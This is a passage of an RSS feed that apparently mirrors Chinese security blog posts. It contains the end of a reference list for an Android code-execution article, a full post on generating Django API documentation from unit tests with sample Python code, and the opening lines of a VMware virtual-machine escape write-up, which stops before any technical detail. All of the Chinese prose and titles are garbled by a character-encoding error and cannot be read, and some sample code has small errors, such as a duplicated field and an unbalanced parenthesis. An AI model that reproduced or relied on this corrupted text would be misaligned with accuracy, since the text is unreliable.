class=&quot;&quot;&gt;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.nowsecure.com/blog/2015/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/&quot;&gt;https://www.nowsecure.com/blog/2015/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://d3adend.org/blog/?p=851&quot;&gt;http://d3adend.org/blog/?p=851&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/functions.html&quot;&gt;https://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/functions.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/secmob/BadKernel&quot;&gt;https://github.com/secmob/BadKernel&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://android.googlesource.com/&quot;&gt;https://android.googlesource.com/&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;</description>
<author>å‘¨çŸ¥æ—¥</author>
<guid isPermaLink="false">2017-07-26-28107901</guid>
<pubDate>Wed, 26 Jul 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>æµ‹è¯•é©±åŠ¨æ–‡æ¡£åœ¨åç«¯ API å¼€å‘ä¸­çš„å®è·µ</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-07-24-28069225.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;æµ‹è¯•é©±åŠ¨æ–‡æ¡£åœ¨åç«¯ API å¼€å‘ä¸­çš„å®è·µ&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28069225&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4b11f4ee60a743d551cd637892361629_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;å¾ˆå¤šäººäº†è§£è¿‡ &lt;a href=&quot;https://docs.python.org/2/library/doctest.html&quot;&gt;Python çš„ doctest&lt;/a&gt;ï¼Œæ˜¯ä»æ³¨é‡Šä¸­å†™æµ‹è¯•ï¼Œæˆ‘ä»¬ç°åœ¨åå‘æ€ç»´ï¼Œä»æµ‹è¯•ç”Ÿæˆæ–‡æ¡£ã€‚&lt;/p&gt;&lt;h2&gt;ç°çŠ¶&lt;/h2&gt;&lt;p&gt;åœ¨å¼€å¤´æœ‰å¿…è¦è¯´æ˜ä¸€ä¸‹ç°åœ¨åç«¯ API çš„å¼€å‘æ¨¡å¼ï¼Œè¿™æ ·æ‰èƒ½æ›´å¥½çš„ç†è§£é‡åˆ°çš„é—®é¢˜ã€‚&lt;/p&gt;&lt;ul&gt;&lt;li&gt;æ¡†æ¶: Django&lt;/li&gt;&lt;li&gt;ç»™å‰ç«¯æä¾›çš„éƒ½æ˜¯ JSON APIï¼Œæ²¡æœ‰åç«¯æ¸²æŸ“çš„ç½‘é¡µ&lt;/li&gt;&lt;li&gt;æ‰€æœ‰çš„ API éƒ½ç»§æ‰¿ APIViewï¼Œä½†æ˜¯å¹¶ä¸æ˜¯ Django REST frameworkï¼ˆä»¥ä¸‹ç®€ç§° DRFï¼Œåå­—å¤ªé•¿äº†ï¼‰ ä¸­çš„ APIViewï¼Œè¿™ä¸ªåé¢ä¼šè¯´åŸå› &lt;/li&gt;&lt;li&gt;ä½¿ç”¨ DRF ä¸­çš„éƒ¨åˆ† serializer æ¥åšæ•°æ®æ ¼å¼éªŒè¯å’Œ QuerySet è½¬æ¢ä¸º Python å­—å…¸åˆ—è¡¨ç­‰ç±»å‹çš„å·¥ä½œ&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;DRF åº“æä¾›äº†å¾ˆå¤šæˆ‘ä»¬å¹¶ä¸ä¼šç”¨åˆ°çš„åŠŸèƒ½ï¼Œæ¯”å¦‚&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ç™»å½•éªŒè¯ï¼Œæƒé™ç®¡ç†ï¼ŒAPI ç‰ˆæœ¬å·ç®¡ç†ï¼Œé™æµã€è‡ªåŠ¨ç¿»é¡µç­‰ç­‰ï¼Œè¿™äº›æˆ‘ä»¬æ›´ä¾§é‡ç‹¬ç«‹å’Œæ‰‹åŠ¨çš„å¤„ç†ã€‚&lt;/li&gt;&lt;li&gt;Generic Views ä¸€ç›´æ˜¯ä¸€ä¸ªè®©æˆ‘æ„Ÿåˆ°ç–‘æƒ‘çš„ä¸œè¥¿ï¼Œçœ‹ä¼¼å†™èµ·æ¥ç®€å•ï¼Œä»£ç é‡å¾ˆå°‘ï¼Œåƒæ˜¯å¡«å……ä¸€äº›é¢„å®šä¹‰çš„å˜é‡å’Œæ–¹æ³•ï¼Œç®€å•çš„å¢åˆ æŸ¥æ”¹ä¼šæ–¹ä¾¿ä¸€ç‚¹ï¼Œä½†æ˜¯åœ¨å®é™…å¤æ‚çš„ä¸šåŠ¡åœºæ™¯ä¸‹ï¼Œå¯èƒ½å¯¼è‡´é—®é¢˜å¤æ‚åŒ–ï¼Œå¹¶æ²¡æœ‰æ˜¾å¼çš„å†™å‡ºæ“ä½œè¿‡ç¨‹æ›´æ¸…æ™°ã€‚&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬ä»¿ç…§ DRF çš„ APIViewï¼Œç»§æ‰¿ Django çš„ View,è‡ªå·±å†™äº†ä¸€ä¸ªæ–°çš„ APIViewï¼ŒåŒ…å«äº†æ ¸å¿ƒåŠŸèƒ½ï¼Œè§£æ JSONï¼ŒåŒæ—¶å¢åŠ äº†éƒ¨åˆ†å¸¸ç”¨æ–¹æ³•ï¼Œæ¯”å¦‚ validate_serializerã€self.successã€self.error å’Œ self.paginate ç­‰ç­‰ã€‚&lt;/p&gt;&lt;p&gt;ä¸‹é¢æ˜¯ä¸€æ®µä¼ªä»£ç &lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class UserProfileAPI(APIView):
    @validate_serializer(ChangeUserProfileSeralizer)
    def put(self):
        ....
        if err:
            return self.error(&quot;ä¿å­˜å¤±è´¥&quot;)
        return self.success(UserProfileSerailzier(user_profile).data)

class ProblemAPI(APIView):
    def get(self):
        return self.success(self.paginate(request,Problem.objects.all(), 
                            ProblemSerializer)))
&lt;/code&gt;&lt;h2&gt;ç°æœ‰çš„æ–‡æ¡£å­˜åœ¨ä»€ä¹ˆé—®é¢˜&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;æ²¡æœ‰æ–‡æ¡£ï¼Œé &quot;å£å£ç›¸ä¼ &quot;å’Œ&quot;å¿ƒæœ‰çµçŠ€&quot;ã€‚&lt;/li&gt;&lt;li&gt;æ‰‹å†™ API æ–‡æ¡£ï¼Œä¸åŒäººå†™å‡ºæ¥çš„å¯èƒ½æ ¼å¼é£æ ¼ç•¥æœ‰å·®å¼‚ï¼Œä¹Ÿä¸å®¹æ˜“ç»Ÿä¸€ç®¡ç†ã€‚æ›´é‡è¦çš„æ˜¯äººéƒ½æ˜¯æ‡’çš„ï¼Œæ²¡æœ‰ç›‘ç£çš„æƒ…å†µä¸‹ï¼Œæ–‡æ¡£èƒ½ä¸å†™å°±ä¸å†™ï¼Œè€Œæµ‹è¯•è¿˜æ˜¯è¦å¿…é¡»è¦å†™çš„ã€‚&lt;/li&gt;&lt;li&gt;ä¸€å¤„ä¿®æ”¹å¾ˆå¤š API å¯èƒ½éƒ½ä¼šå˜ï¼Œæ¯”å¦‚æŸä¸€ä¸ª Model ä¿®æ”¹äº†å­—æ®µï¼Œå¾ˆå¤š API çš„è¿”å›å€¼éƒ½å¯èƒ½å—åˆ°å½±å“ï¼Œæ‰‹åŠ¨çš„é€ä¸ªä¿®æ”¹å¹¶ä¸ç§‘å­¦ã€‚&lt;/li&gt;&lt;li&gt;å·²æœ‰çš„æ–‡æ¡£ç”Ÿæˆå·¥å…·è‡ªå®šä¹‰ç¨‹åº¦ä¸é«˜ï¼Œæ¯”å¦‚ &lt;a href=&quot;https://github.com/marcgibbons/django-rest-swagger&quot;&gt;Django REST Swagger&lt;/a&gt; è¦æ±‚ Generic Views å°±æ”¾å¼ƒäº†ã€‚&lt;/li&gt;&lt;li&gt;è¿˜æœ‰äº›æ–‡æ¡£ç”Ÿæˆå·¥å…·æ˜¯åœ¨æ³¨é‡Šä¸­ä½¿ç”¨ç‰¹å®šçš„æ ¼å¼æè¿° API å­—æ®µå’Œç»†èŠ‚çš„ï¼Œå…¶å®å’Œæ‰‹å†™æ–‡æ¡£æ²¡æœ‰æœ¬è´¨ä¸Šçš„å·®å¼‚ã€‚&lt;/li&gt;&lt;li&gt;ä¸Šé¢å‡ æ¡æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼šæ‰‹å†™çš„æ–‡æ¡£å¾ˆéš¾è‡ªåŠ¨åŒ–éªŒè¯æ˜¯å¦æ­£ç¡®ï¼Œæµ‹è¯•ç”Ÿæˆæ–‡æ¡£å¯ä»¥ä¿è¯å’Œæµ‹è¯•æ˜¯ä¸€è‡´çš„ã€‚&lt;/li&gt;&lt;li&gt;è™½ç„¶&quot;ä»£ç å³æ–‡æ¡£&quot;ï¼Œä½†æ˜¯ä¹Ÿåªé€‚ç”¨äºé API æ–‡æ¡£ï¼Œæ¯”å¦‚æ•°æ®åº“è®¾è®¡ã€æ¶æ„è®¾è®¡ã€ç®—æ³•è®¾è®¡ç­‰ï¼Œå› ä¸ºä»£ç å¹¶ä¸ä¸€å®šé€‚åˆä¼ æ’­ç»™æ‰€æœ‰äººçœ‹ï¼Œå°¤å…¶æ˜¯ API æ–‡æ¡£ä¸€èˆ¬éƒ½æ˜¯å¯¹å¤–çš„ï¼Œè€Œä¸”ä»£ç ä¸­çš„æ³¨é‡Šç»å¸¸æ˜¯åˆ†æ•£çš„ï¼Œæ–‡æ¡£ä¸Šä¸€ä¸ª API çš„è¯´æ˜ã€è¯·æ±‚ã€å“åº”ç­‰å‡ éƒ¨åˆ†æ•°æ®å¯èƒ½åˆ†æ•£åœ¨å‡ ä¸ªæ–‡ä»¶ä¸­ã€‚&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;æˆ‘ä»¬çš„å®è·µ&lt;/h2&gt;&lt;p&gt;è¦æ”¹è¿›ä¸Šé¢çš„é—®é¢˜ï¼ŒåŸºæœ¬åŸåˆ™æ˜¯å°½é‡å°‘æ”¹åŠ¨å·²æœ‰çš„ä»£ç ï¼Œæ‰€ä»¥ç»è¿‡å’Œ @reverland çš„ä¸€ç•ªè®¨è®ºï¼Œç¡®å®šä½¿ç”¨ä¸‹é¢çš„æ–¹æ³•ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ä½¿ç”¨ serializer ç”Ÿæˆæ•°æ®æ ¼å¼æè¿°æ€§æ–‡æ¡£&lt;/li&gt;&lt;li&gt;ä½¿ç”¨éƒ¨åˆ†æµ‹è¯•å……å½“ API æ ·ä¾‹æ•°æ®&lt;/li&gt;&lt;li&gt;CI çš„æ—¶å€™ï¼Œè¯†åˆ« commit ä¿¡æ¯ä¸­çš„doc deploy åç”Ÿæˆå’Œè‡ªåŠ¨éƒ¨ç½²æ–‡æœ¬ç‰ˆæ–‡æ¡£å’Œ Postman å¯¼å‡ºæ ¼å¼&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;serializer çš„æ–‡æ¡£&lt;/h2&gt;&lt;p&gt;ç”±ä¸€ä¸ª serializer ç”Ÿæˆå¯¹åº”çš„æè¿°æ€§æ–‡æ¡£ç›¸å¯¹æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œä¸€ä¸ªå…¸å‹çš„ serializer æ˜¯è¿™æ ·çš„&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class IPOrSubnetField(serializers.CharField):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        if not kwargs.get(&quot;help_text&quot;):
            self.help_text = &quot;IPv4 çš„ IP æˆ–è€…å­ç½‘å½¢å¼å­—ç¬¦ä¸²&quot;

    def to_internal_value(self, data):
        pass

class CreateRuleSerializer(serializers.Serializer):
    &quot;&quot;&quot;
    ä¸€æ¡è§„åˆ™å¯ä»¥å°ç¦ä¹Ÿå¯ä»¥é™åˆ¶é¢‘ç‡ï¼Œå°ç¦çš„æ—¶å€™ï¼Œä¸éœ€è¦ä¼ é€’ e å’Œ f å­—æ®µã€‚
    &quot;&quot;&quot;
    a = serializers.IntegerField(allow_null=True, required=False)
    b = serializers.CharField(allow_null=True, required=False)
    d = serializers.CharField(allow_null=True, required=False)
    d = serializers.ChoiceField(choices=[RuleAction.forbid, RuleAction.limit_rate])
    e = serializers.IntegerField(required=False, allow_null=True, min_value=1)
    f = serializers.IntegerField(required=False, allow_null=True, min_value=1)
    g = serializers.CharField(max_length=128, allow_blank=True, required=False)
    h = serializers.ListField(child=IPOrSubnetField())&lt;/code&gt;&lt;p&gt;ä¸‹é¢æ˜¯æˆ‘ä»¬ç”Ÿæˆçš„è¡¨æ ¼æ–‡æ¡£&lt;/p&gt;&lt;p&gt;æ•°æ®æ ¼å¼&lt;/p&gt;&lt;blockquote&gt;ä¸€æ¡è§„åˆ™å¯ä»¥å°ç¦ä¹Ÿå¯ä»¥é™åˆ¶é¢‘ç‡ï¼Œå°ç¦çš„æ—¶å€™ï¼Œä¸éœ€è¦ä¼ é€’ e å’Œ f å­—æ®µã€‚&lt;/blockquote&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1a7a0507ee3eda5dd52945ec3351cf22_r.png&quot; data-rawwidth=&quot;678&quot; data-rawheight=&quot;475&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;è¿™ä¸ªè¡¨æ ¼åŒ…å«äº†å­—æ®µåã€æ•°æ®ç±»å‹ã€æ•°æ®æ ¼å¼ã€å­—æ®µé¢å¤–è¯´æ˜ç­‰å‡ éƒ¨åˆ†ä¿¡æ¯ã€‚&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ä¸€ä¸ª serializer çš„æ‰€æœ‰å­—æ®µå¯ä»¥åœ¨ serializer.fields.items() ä¸­å¾—åˆ°ï¼Œåªè¦éå†ä¸€ä¸‹æ‰€æœ‰çš„å­—æ®µå°±ä¸éš¾å†é’ˆå¯¹æ€§çš„å¤„ç†ã€‚&lt;/li&gt;&lt;li&gt;å­—æ®µçš„ç±»å‹å¾ˆå®¹æ˜“æ¨æ–­ï¼Œis_instance(field, serializers.IntegerField) ç­‰é€ä¸ªçš„æ¯”è¾ƒå°±å¯ä»¥çŸ¥é“ã€‚&lt;/li&gt;&lt;li&gt;å‡ ä¹æ‰€æœ‰çš„å­—æ®µéƒ½æ”¯æŒ required å’Œ null å‚æ•°ï¼Œä»£è¡¨æ˜¯å¦å…è®¸ä¸ä¼ é€’è¯¥å­—æ®µå’Œæ˜¯å¦å…è®¸è¯¥å­—æ®µçš„å€¼ä¸º nullã€‚å¯¹äºå­—ç¬¦ä¸²ç±»å‹å’Œæ•°æ®ç±»å‹çš„å­—æ®µç­‰ï¼Œè¿˜æ”¯æŒ max_length / max_value å’Œ min_length / min_value å‚æ•°ï¼Œä»£è¡¨æ•°æ®çš„èŒƒå›´ï¼Œå…¶ä»–çš„ä¸ªåˆ«æ ¼å¼é™åˆ¶å¯ä»¥å‚è€ƒä¸‹ DRF çš„æºç ã€‚&lt;/li&gt;&lt;li&gt;æœ‰çš„å­—æ®µéœ€è¦é¢å¤–è¯´æ˜æ‰æ–¹ä¾¿ç†è§£ï¼Œæˆ–è€…æœ‰äº›å­—æ®µæ˜¯äº’æ–¥çš„ï¼Œä¸å¯ä»¥åŒæ—¶ä¼ é€’ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯è¦æ”¯æŒåœ¨ä»£ç ä¸­è‡ªæˆ‘æè¿°çš„åŠŸèƒ½ï¼Œè¿™äº›è¯´æ˜æœ‰ä¸¤å¤„æ¥æºï¼Œä¸€ä¸ªæ˜¯ serializer çš„ doc stringï¼Œå¦ä¸€ä¸ªæ˜¯ field çš„ help_text å±æ€§ã€‚&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;åœ¨å•å…ƒæµ‹è¯•çš„æ—¶å€™ï¼ŒClient ä¼šä¼ é€’ä¸€ä¸ªç‰¹æ®Šçš„ HTTP å¤´ï¼Œè¿™æ · @validate_serializer å°±çŸ¥é“æ˜¯å¦è¦ç”Ÿæˆ serializer çš„æ–‡æ¡£äº†ã€‚&lt;/p&gt;&lt;h2&gt;APIæ•°æ®çš„æ–‡æ¡£&lt;/h2&gt;&lt;p&gt;ä¸€ä¸ª API ä»…ä»…æœ‰æ•°æ®æ ¼å¼çš„è¦æ±‚æ˜¯ä¸å¤Ÿçš„ï¼Œæœ€å¥½è¿˜èƒ½å¤Ÿæä¾›ä¸€äº›å¸¸è§çš„æ­£ç¡®å’Œé”™è¯¯ä½¿ç”¨çš„ä¾‹å­ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥å¸®åŠ©ç”¨æˆ·å»æ›´å¥½çš„ç†è§£ API çš„ç”¨é€”ï¼Œå•å…ƒæµ‹è¯•çš„æµ‹è¯•ç”¨ä¾‹å°±æ˜¯è¿™äº›ç¤ºä¾‹æœ€å¥½çš„æ¥æºã€‚&lt;/p&gt;&lt;p&gt;ä¸€ä¸ªå…¸å‹çš„å•å…ƒæµ‹è¯•æ˜¯è¿™æ ·å­çš„&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class ACLAPITest(APITestCase):
    @document
    def test_create_acl_rule(self):
        &quot;&quot;&quot;
        åˆ›å»º acl è§„åˆ™ï¼Œåªæœ‰ cidr
        &quot;&quot;&quot;
        resp = self.client.post(self.url, data=self.base_rule)
        self.assertSuccess(resp)
        ...        
        return resp

    @document
    def test_edit_acl_rule(self):
        &quot;&quot;&quot;
        ç¼–è¾‘ acl è§„åˆ™
        &quot;&quot;&quot;
        rule_id = self.test_create_acl_rule_ip().data[&quot;data&quot;][&quot;id&quot;]
        ...
        resp = self.client.put(self.url, data=new_rule)
        self.assertSuccess(resp)
        ...
&lt;/code&gt;&lt;p&gt;è¿™é‡Œæµ‹è¯•åˆ›å»ºå’Œç¼–è¾‘ ACL è§„åˆ™ã€‚@document æ˜¯æ ‡è®°è¿™ä¸ªæµ‹è¯•ç”¨ä¾‹è¦ç”Ÿæˆæ–‡æ¡£ã€‚æˆ‘ä»¬é€šè¿‡ä¿®æ”¹ Client çš„å±æ€§æ¥å®ç°ã€‚&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;def document(method):
    @functools.wraps(method)
    def handle(*args, **kwargs):
        if args[0]._testMethodName == method.__name__:
            args[0].client.test_method_name = args[0]._testMethodName
            args[0].client.doc = method.__doc__
            args[0].client.running_module = method.__module__.split(&quot;.&quot;)[0]
        ret = method(*args, **kwargs)
        return ret
    return handle
&lt;/code&gt;&lt;p&gt;è¦æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰ä¿®é¥°åœ¨å½“å‰æ­£åœ¨æ‰§è¡Œçš„æµ‹è¯•ä¸Šï¼Œæ‰ä¼šå»æ›´æ–°è¿™äº›å±æ€§ï¼Œå¦åˆ™è¿è¡Œ test_edit_acl_rule çš„æ—¶å€™ï¼Œtest_create_acl_rule ä¼šæŠŠ Client çš„å±æ€§æ”¹é”™ã€‚&lt;/p&gt;&lt;p&gt;æµ‹è¯•ä¸­çš„ Client å°±æ˜¯ä¸€ä¸ªç”Ÿæˆ HTTP è¯·æ±‚ï¼Œç„¶åæ¨¡æ‹Ÿå‘é€è¯·æ±‚çš„ç»„ä»¶ï¼Œè¦æƒ³è®°å½•ä¸‹è¯·æ±‚å’Œå“åº”çš„å†…å®¹ï¼Œæ›¿æ¢æ‰ DRF åŸç”Ÿ Client æ˜¯å¿…é¡»çš„ï¼Œå½“ç„¶è¿™ä¸ªä¹Ÿä¸éš¾ï¼Œåªè¦ç»§æ‰¿åŸæ¥çš„ Clientï¼Œé‡è½½ç›¸å…³æ–¹æ³•ï¼Œè®°å½•è¯·æ±‚æ•°æ®ï¼Œç„¶åè°ƒç”¨çˆ¶ç±»çš„æ–¹æ³•ï¼Œå†è®°å½•å“åº”æ•°æ®å°±å¯ä»¥äº†ã€‚&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class DocumentAPIClient(APIClient):
    test_method_name = &quot;&quot;
    doc = &quot;&quot;
    running_module = &quot;&quot;

    def _request(self, method, *args, **kwargs):
        make_doc = self.test_method_name == inspect.stack()[2].function
        if make_doc:
            kwargs[&quot;serializer_gen_doc&quot;] = True
        # kwargs ä¸­çš„é¢å¤–å‚æ•°ï¼Œåœ¨ view ä¸­ request.META ä¸­å¯ä»¥å–åˆ°ï¼Œç±»ä¼¼é¢å¤–çš„ HTTP å¤´
        resp = getattr(super(), method)(*args, **kwargs)

        if make_doc:
            # è®°å½• API è¯·æ±‚å’Œå“åº”
            pass

class APITestCase(TestCase):
    client_class = DocumentAPIClient
&lt;/code&gt;&lt;p&gt;æœ‰å‡ ç‚¹æ˜¯è¦æ³¨æ„çš„&lt;/p&gt;&lt;ul&gt;&lt;li&gt;æµ‹è¯•ç”¨ä¾‹å­˜åœ¨åµŒå¥—å…³ç³»çš„æ—¶å€™ï¼Œæ¯”å¦‚ test_edit_acl_rule ä¸­ï¼Œæˆ‘ä»¬åªå…³å¿ƒæœ¬æµ‹è¯•ä¸­å‘é€çš„è¯·æ±‚ï¼Œè€Œä¸å…³å¿ƒè°ƒç”¨çš„ test_create_acl_rule ä¸­å‘é€çš„è¯·æ±‚ï¼Œæ‰€ä»¥ Client éœ€è¦æ ¹æ®ä»£ç è°ƒç”¨æ ˆæ¥åˆ¤æ–­è‡ªå·±çš„ä½ç½®ã€‚&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;è¯·æ±‚æ˜¯åœ¨å½“å‰æ­£åœ¨æ‰§è¡Œçš„ test_create_acl_rule ä¸­å‘å‡ºçš„ï¼Œé‚£ä¹ˆå‡½æ•°æ ˆæ˜¯&lt;/p&gt;&lt;ul&gt;&lt;ul&gt;&lt;li&gt;self._request(0)&lt;/li&gt;&lt;li&gt;self.postâ€¦(1)&lt;/li&gt;&lt;li&gt;test_create_acl_rule(2)&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;test_edit_acl_rule ä¸­è°ƒç”¨äº† test_create_acl_rule æ—¶ï¼Œself.test_method_name == &quot;test_edit&quot;ï¼Œè€Œå‡½æ•°æ ˆæ˜¯&lt;/p&gt;&lt;ul&gt;&lt;ul&gt;&lt;li&gt;self._request(0)&lt;/li&gt;&lt;li&gt;self.postâ€¦(1)&lt;/li&gt;&lt;li&gt;test_create_acl_rule(2)&lt;/li&gt;&lt;li&gt;test_edit_acl_rule(3)&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;ä¸æ˜¯æ‰€æœ‰çš„ API éƒ½æ˜¯å¯ JSON çš„ï¼Œæ¯”å¦‚ä¸Šä¼ æˆ–è€…ä¸‹è½½æ–‡ä»¶çš„è¯·æ±‚ï¼Œç”Ÿæˆæ–‡æ¡£çš„æ—¶å€™éœ€è¦ç‰¹ä¾‹å¤„ç†ä¸‹ã€‚å¯ä»¥å†™ä¸€ä¸ªè‡ªå®šä¹‰çš„ JSON Encoder æ¥å®ç°ã€‚&lt;/li&gt;&lt;/ul&gt;&lt;code lang=&quot;python&quot;&gt;class MultipartToJsonLikeEncoder(json.JSONEncoder):
     def default(self, o):
         if isinstance(o, io.BytesIO) or isinstance(o, io.StringIO):
             return &quot;&amp;lt;æ–‡ä»¶ä¸Šä¼  ğŸ’¾ &amp;gt;&quot;
         return json.JSONEncoder.default(self, o)&lt;/code&gt;&lt;ul&gt;&lt;li&gt;ç”Ÿæˆæ–‡æ¡£çš„æ—¶å€™è¦æ’åºï¼Œå°†å“åº”æ­£ç¡®çš„æ’åœ¨å‰é¢ï¼Œå“åº”é”™è¯¯çš„æ’åœ¨åé¢ã€‚&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;æ€»ç»“&lt;/h2&gt;&lt;p&gt;è§£å†³äº†å·²æœ‰çš„é—®é¢˜ï¼Œè€Œä¸”é¼“åŠ±å¼€å‘è€…è®¤çœŸçš„å»å†™æ›´è§„èŒƒçš„æµ‹è¯•&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ä¸ºäº†ç”Ÿæˆæ–‡æ¡£ï¼Œè‡³å°‘ä¼šå†™ä¸€ä¸ªç®€åŒ–ç‰ˆæµ‹è¯•ï¼Œæ€»æ¯”æ²¡æœ‰æµ‹è¯•è¦å¥½&lt;/li&gt;&lt;li&gt;ä¸€ä¸ªæµ‹è¯•åªå¹²ä¸€ä»¶äº‹æƒ…ï¼Œå¦åˆ™ç”Ÿæˆçš„æ–‡æ¡£ä¼šæœ‰é‡å¤&lt;/li&gt;&lt;li&gt;æµ‹è¯•ä¸­ä¼šå†™æ³¨é‡Šæ ‡æ˜æµ‹è¯•çš„ç”¨é€”&lt;/li&gt;&lt;/ul&gt;</description>
<author>CeleryL</author>
<guid isPermaLink="false">2017-07-24-28069225</guid>
<pubDate>Mon, 24 Jul 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>åˆ©ç”¨ä¸€ä¸ªå †æº¢å‡ºæ¼æ´å®ç°VMwareè™šæ‹Ÿæœºé€ƒé€¸</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-07-06-27733895.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;åˆ©ç”¨ä¸€ä¸ªå †æº¢å‡ºæ¼æ´å®ç°VMwareè™šæ‹Ÿæœºé€ƒé€¸&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/27733895&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d158e3218b51842880080a282a3bf0cd_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;[ä½œè€…ï¼šæå°é¾™ï¼ˆacezï¼‰ï¼Œä¸­æ–‡ç¿»è¯‘ï¼škelwin]&lt;br&gt;&lt;/p&gt;&lt;h2&gt;1. ä»‹ç»&lt;/h2&gt;&lt;p&gt;2017å¹´3æœˆï¼Œé•¿äº­å®‰å…¨ç ”ç©¶å®éªŒå®¤ï¼ˆ&lt;a href=&quot;https://chaitin.cn/&quot; data-editable=&quot;true&quot; data-title=&quot;Chaitin&quot; class=&quot;&quot;&gt;Chaitin&lt;/a&gt; Security Research Labï¼‰å‚åŠ äº†Pwn2Owné»‘å®¢å¤§èµ›ï¼Œæˆ‘ä½œä¸ºå›¢é˜Ÿçš„ä¸€å‘˜ï¼Œä¸€ç›´ä¸“æ³¨äºVMware Workstation Proçš„ç ´è§£ï¼Œå¹¶æˆåŠŸåœ¨èµ›å‰å®Œæˆäº†ä¸€ä¸ªè™šæ‹Ÿæœºé€ƒé€¸çš„æ¼æ´åˆ©ç”¨ã€‚ï¼ˆå¾ˆä¸ï¼‰å¹¸è¿çš„æ˜¯ï¼Œå°±åœ¨Pwn2Ownæ¯”èµ›çš„å‰ä¸€å¤©ï¼ˆ3æœˆ14æ—¥ï¼‰ï¼ŒVMwareå‘å¸ƒäº†ä¸€ä¸ªæ–°çš„ç‰ˆæœ¬ï¼Œå…¶ä¸­ä¿®å¤äº†æˆ‘ä»¬æ‰€åˆ©ç”¨çš„æ¼æ´ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä¼šä»‹ç»æˆ‘ä»¬ä»å‘ç°æ¼æ´åˆ°å®Œæˆåˆ©ç”¨çš„æ•´ä¸ªè¿‡ç¨‹ã€‚æ„Ÿè°¢&lt;a href=&quot;http://weibo.com/kelwinyang&quot; data-editable=&quot;true&quot; data-title=&quot;@kelwin&quot; class=&quot;&quot;&gt;@kelwin&lt;/a&gt;åœ¨å®ç°æ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­ç»™äºˆçš„å¸®åŠ©ï¼Œä¹Ÿæ„Ÿè°¢ZDIçš„æœ‹å‹ï¼Œä»–ä»¬è¿‘æœŸä¹Ÿå‘å¸ƒäº†ä¸€ç¯‡ç›¸å…³&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware&quot; data-editable=&quot;true&quot; data-title=&quot;åšå®¢&quot; class=&quot;&quot;&gt;åšå®¢&lt;/a&gt;ï¼Œæ­£æ˜¯è¿™ç¯‡åšæ–‡ä¿ƒä½¿æˆ‘ä»¬å®Œæˆæœ¬ç¯‡writeupã€‚&lt;/p&gt;&lt;p&gt;æœ¬æ–‡ä¸»è¦ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šé¦–å…ˆæˆ‘ä»¬ä¼šç®€è¦ä»‹ç»VMwareä¸­çš„RPCIæœºåˆ¶ï¼Œå…¶æ¬¡æˆ‘ä»¬ä¼šæè¿°æœ¬æ–‡ä½¿ç”¨çš„æ¼æ´ï¼Œæœ€åè®²è§£æˆ‘ä»¬æ˜¯å¦‚ä½•åˆ©ç”¨è¿™ä¸€ä¸ªæ¼æ´æ¥ç»•è¿‡ASLRå¹¶å®ç°ä»£ç æ‰§è¡Œçš„ã€‚&lt;/p&gt;&lt;h2&gt;2. VMware 